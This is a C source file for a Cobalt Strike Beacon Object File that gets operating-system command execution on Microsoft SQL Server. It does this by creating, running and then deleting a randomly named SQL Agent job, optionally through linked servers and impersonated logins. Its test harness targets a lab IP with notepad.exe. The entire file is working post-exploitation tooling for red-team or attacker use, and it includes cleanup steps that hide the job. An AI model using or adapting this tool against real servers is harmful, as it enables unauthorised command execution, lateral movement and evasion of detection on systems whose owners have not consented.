#include "bofdefs.h"
#include "base.c"
#include "sql.c"
#include "sql_modules.c"
#include "sql_agent.c"


void ExecuteAgentCommand(char* server, char* database, char* link, char* impersonate, char* command)
{
    SQLHENV env			 = NULL;
    SQLHSTMT stmt 		 = NULL;
	SQLHDBC dbc 		 = NULL;
	char* jobName 		 = NULL;
	char* stepName 		 = NULL;
	SQLRETURN ret;


    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	if (link == NULL)
	{
		internal_printf("[*] Executing command in SQL Agent job on %s\n\n", server);
	}
	else
	{
		internal_printf("[*] Executing command in SQL Agent job on %s via %s\n\n", link, server);
	}

	//
	// allocate statement handle
	//
	ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to allocate statement handle\n");
		goto END;
	}

	//
	// if using linked server, ensure rpc is enabled
	//
	if (link != NULL)
	{
		if (IsRpcEnabled(stmt, link))
		{
			internal_printf("[*] RPC out is enabled\n");
		}
		else
		{
			internal_printf("[!] RPC out is not enabled\n");
			goto END;
		}
		
		//
		// close the cursor
		//
		ODBC32$SQLCloseCursor(stmt);
	}

	if (!IsAgentRunning(stmt, link, impersonate))
	{
		internal_printf("[!] SQL Agent is not running\n");
		goto END;
	}

	//
	// Close the cursor
	//
	ret = ODBC32$SQLCloseCursor(stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to close cursor\n");
		goto END;
	}

	internal_printf("[*] SQL Agent is running\n");

	//
	// Add agent job
	//
	InitRandomSeed();
	jobName = GenerateRandomString(8);
	stepName = GenerateRandomString(8);

	if (!AddAgentJob(stmt, link, impersonate, command, jobName, stepName))
	{
		internal_printf("[!] Failed to add agent job\n");
		goto END;
	}

	ClearCursor(stmt);
	internal_printf("[*] Added job\n");

	//
	// Print jobs to verify job was added
	//
	if (!GetAgentJobs(stmt, link, impersonate))
	{
		internal_printf("[!] Failed to get agent jobs\n");
		goto END;
	}

	internal_printf("\n");
	PrintQueryResults(stmt, TRUE);

	//
	// Close the cursor
	//
	ret = ODBC32$SQLCloseCursor(stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to close cursor\n");
		goto END;
	}

	internal_printf("\n[*] Executing job %s and waiting 5 seconds...\n", jobName);
	ExecuteAgentJob(stmt, link, impersonate, jobName);
	

	ClearCursor(stmt);
	
	//
	// Cleanup job
	//
	if (!DeleteAgentJob(stmt, link, impersonate, jobName))
	{
		internal_printf("[!] Failed to delete agent job\n");
		goto END;
	}

	internal_printf("[*] Job %s deleted\n", jobName);

	ClearCursor(stmt);

	//
	// Print jobs to verify job was added
	//
	if (!GetAgentJobs(stmt, link, impersonate))
	{
		internal_printf("[!] Failed to get agent jobs\n");
		goto END;
	}

	internal_printf("\n");
	PrintQueryResults(stmt, TRUE);
	
	
END:
	if (jobName != NULL) intFree(jobName);
	if (stepName != NULL) intFree(stepName);
	ODBC32$SQLCloseCursor(stmt);
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* command;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	command 	= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;

	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}
	
	ExecuteAgentCommand(server, database, link, impersonate, command);

	printoutput(TRUE);
};

#else

int main()
{
	//
	// GOAD uses SQLExpress so turning to makeshift lab here
	//
	internal_printf("============ BASE TEST ============\n\n");
	ExecuteAgentCommand("192.168.0.215", "master", NULL, NULL, "notepad.exe");

	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
	ExecuteAgentCommand("192.168.0.215", "master", NULL, "sa", "notepad.exe");

	internal_printf("\n\n============ LINK TEST ============\n\n");
	ExecuteAgentCommand("192.168.0.215", "master", "TRETOGOR", NULL, "notepad.exe");
}

#endif
